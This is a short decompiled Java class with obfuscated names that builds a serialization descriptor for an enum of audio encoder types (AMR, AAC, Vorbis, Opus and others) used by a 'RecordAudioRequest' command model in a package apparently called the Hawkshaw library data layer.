package com.hawkshaw.library.datalayer.models;

import com.hawkshaw.library.datalayer.models.Command;
import i3.C0542a;
import java.lang.annotation.Annotation;

public final class j extends j3.j implements C0542a {

    /* renamed from: D  reason: collision with root package name */
    public static final j f4894D = new j3.j(0);

    public final Object invoke() {
        return v3.j.e("com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioEncoderEnum", Command.RecordAudioRequest.AudioEncoderEnum.values(), new String[]{"DEFAULT", "AMR_NB", "AMR_WB", "AAC", "HE_AAC", "AAC_ELD", "VORBIS", "OPUS"}, new Annotation[][]{null, null, null, null, null, null, null, null});
    }
}
